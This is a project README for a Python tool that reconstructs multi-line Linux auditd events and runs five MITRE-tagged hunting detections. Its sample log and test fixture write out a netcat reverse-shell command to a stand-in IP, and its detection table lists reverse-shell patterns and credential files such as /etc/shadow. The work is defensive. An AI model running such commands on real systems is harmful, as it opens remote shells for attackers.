# Linux auditd Threat Hunter

EDR-style hunting detections against real **Linux `auditd`** telemetry (`/var/log/audit/audit.log` format) - **5 detections**, each tagged with a real MITRE ATT&CK technique. This is the Linux-side complement to this portfolio's `sysmon-log-hunter`, which covers the same kind of hunting on Windows via Sysmon.

## The Real Parsing Problem: One Event, Several Lines

auditd does not log one line per event. A single `execve()` call produces **several separate lines, of different record types**, that only make sense joined together by a shared audit ID (`msg=audit(<timestamp>.<msec>:<serial>)`):

```
type=SYSCALL msg=audit(1731939600.100:2001): ... syscall=59 success=yes
    auid=1000 uid=1000 comm="bash" exe="/bin/bash" key=(null)
type=EXECVE  msg=audit(1731939600.100:2001): argc=3 a0="bash" a1="-c"
    a2="nc -e /bin/sh 203.0.113.9 4444"
type=CWD     msg=audit(1731939600.100:2001):  cwd="/tmp"
type=PATH    msg=audit(1731939600.100:2001): item=0 name="/bin/bash" ...
```

The `SYSCALL` line tells you *who* ran something (`comm`, `exe`, `uid`, `auid`) and *what syscall* (`execve`, numeric `59`). The `EXECVE` line tells you the actual command line - but only as separate `a0`, `a1`, `a2`... arguments that have to be joined back into order. Read either line in isolation and you lose the finding entirely: "a process called execve" tells you nothing; "bash ran `nc -e /bin/sh 203.0.113.9 4444`" is a reverse shell. `parser.py`'s `load_events()` groups every line by its shared `timestamp:serial` ID before building one `AuditEvent` per real event - the same kind of multi-event correlation this portfolio's `sysmon-log-hunter` does across EventID-1/EventID-3 pairs, applied here to auditd's own record-splitting convention instead.

## What This Project Hunts

| ID | Detection | Severity | ATT&CK |
|---|---|---|---|
| LHUNT-1 | An `execve()` call's joined command line matches a reverse-shell pattern (`/dev/tcp/`, `nc -e`, `bash -i`, `/bin/sh -i`, `ncat `) | Critical | T1059 |
| LHUNT-2 | A non-root login session (`auid` != 0) successfully calls `setuid()`/`setresuid()` - privilege escalation | Critical | T1548 |
| LHUNT-3 | A non-root process (`uid` != 0) accesses a sensitive file (`/etc/shadow`, `/etc/sudoers`, `~/.ssh/id_rsa`, `/etc/pam.d/common-auth`) | Critical | T1003 |
| LHUNT-4 | A process not on a short allowlist (`cron`, `systemd`, `dpkg`/`apt`) writes to a persistence location (`/etc/cron.d/`, `/etc/crontab`, `/etc/systemd/system/`, `/var/spool/cron/`, `/etc/rc.local`) | High | T1053.003 |
| LHUNT-5 | A shell or scripting process (`bash`, `sh`, `python3`, `perl`, `nc`, `ncat`) makes its own outbound `connect()` call - a classic C2-beacon/reverse-shell signature | High | T1071 |

## Relationship to This Portfolio's `sysmon-log-hunter`

`sysmon-log-hunter` does the equivalent job for Windows telemetry (Sysmon EventID 1/3/22 as JSON). This tool is NOT a port of that code - the two platforms' logging conventions are different enough that the actual parsing problem is different (Sysmon gives you one JSON object per event with a flat `EventData.Data` list; auditd gives you several separate plain-text lines that must be joined by a shared numeric ID). The *shape* of the hunting logic rhymes (both look for suspicious process launches, persistence, and C2-style network behavior, both tag MITRE techniques), but the engineering work - correctly reconstructing one event out of several lines - had to be solved fresh for this real format.

## Tech Stack

- Python 3.11, standard library only (`re`, `dataclasses`, `argparse`, `json`, `datetime`) - no third-party dependencies

## Setup

```bash
python3 scanner.py /var/log/audit/audit.log
python3 scanner.py audit.log --json report.json --fail-on critical
```

## Testing

`test_fixtures/benign_audit.log` is a real-shaped auditd log with three ordinary events (`ls`, `cat` on a normal file, `curl` making an outbound connection - not from a shell process, so it doesn't trip LHUNT-5). `test_fixtures/malicious_audit.log` has five events, each built to trip exactly one of the five hunts: a `bash -c "nc -e /bin/sh ..."` reverse shell, a non-root-session `setuid()` call, a `cat` of `/etc/shadow`, a `bash`-written file under `/etc/cron.d/`, and a `bash` process calling `connect()` directly. `run_test.sh` runs the real scanner against both:

```bash
sh test_fixtures/run_test.sh
```

9 assertions, all passing - including one that specifically confirms LHUNT-1's reported command is the **full joined EXECVE argv** (`"bash -c nc -e /bin/sh 203.0.113.9 4444"`), not a single fragment, proving the SYSCALL/EXECVE/PATH lines were actually correlated by their shared audit ID rather than read as independent, unrelated lines.

## Architecture

```
scanner.py (CLI: severity-sorted report, JSON output, --fail-on exit codes)
        |
        v
parser.py: groups raw lines by shared audit ID (timestamp:serial),
    joins EXECVE argv, reassembles one AuditEvent per real event
        |
        v
checks.py: 5 MITRE-tagged hunts against the reassembled events
        |
        v
Console report (grouped by severity) + optional JSON; exit code reflects --fail-on
```

## Project Structure

```
linux-auditd-threat-hunter/
├── scanner.py                      # CLI
├── parser.py                       # Real auditd multi-line event correlation
├── checks.py                       # 5 MITRE ATT&CK-tagged hunts
└── test_fixtures/
    ├── benign_audit.log            # Real auditd syntax, 0 findings expected
    ├── malicious_audit.log         # Real auditd syntax, all 5 hunts fire
    └── run_test.sh                 # Runs scanner.py against both
```

## What I Learned

- The multi-line-per-event structure is the single most important real-world detail about auditd, and it's invisible until you actually look at a real log - a naive line-by-line reader would report "a SYSCALL record" and "an EXECVE record" as two separate, context-free facts instead of the one meaningful event ("bash ran a reverse shell") they actually represent together. Designing `parser.py` around grouping-by-shared-ID first, before writing a single detection, was the right order to do the work in.
- auditd's `success` field matters as much as the syscall itself - a `setuid()` call that *failed* (a non-root process trying and being denied) is a very different finding from one that *succeeded*, and LHUNT-2 specifically requires `success="yes"` rather than just "the syscall was attempted," to avoid flagging routine permission denials as actual privilege escalation.
- `auid` (the login/audit UID - which session a process originally authenticated as) and `uid` (the process's *current* effective UID) are genuinely different fields with different meanings, and conflating them would have broken LHUNT-2 specifically: a root-owned daemon routinely calls `setuid()` to drop privileges (not a finding), while a session that *logged in* as a non-root user successfully gaining `uid=0` via `setuid()` is the actual privilege-escalation signal - distinguishing those required keeping both fields and checking `auid`, not `uid`, against "was this session originally non-root."

## Next Steps

- A correlation detection joining this tool's EXECVE/connect events to DNS lookups (would need a DNS-resolution audit rule enabled) to catch a reverse shell that resolves a domain rather than connecting to a bare IP - the current LHUNT-1/LHUNT-5 patterns would miss that variant.
- Expand `SYSCALL_NAMES` to cover more of the real x86_64 syscall table (currently a short, curated list for exactly what the 5 hunts need) so the tool could report every parsed event's syscall name in a general-purpose browsing mode, not just flagged ones.
- Feed this tool's findings into `bsi-compliance-aggregator` as a sixth adapter - Linux-host intrusion indicators map naturally onto BSI's `SYS.1.3` Baustein, already used by `linux-hardening-auditor` in this portfolio for the same host type's static configuration checks.
